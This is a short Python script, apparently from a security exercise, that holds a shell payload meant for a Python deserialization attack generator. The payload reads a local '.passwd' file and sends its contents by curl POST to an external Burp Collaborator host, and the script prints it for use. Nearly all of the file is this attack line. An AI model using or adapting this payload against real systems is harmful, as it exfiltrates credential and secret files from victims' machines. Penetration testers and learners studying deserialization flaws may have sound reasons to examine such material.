import requests

x = "me=$(cat .passwd) ; curl -d \"param=$me\" -X POST http://a1czmon26126jca5rvcz35uw5nbszh.burpcollaborator.net/"

print(x)
# using python-deserialization-attack-payload-generator tool for generate payload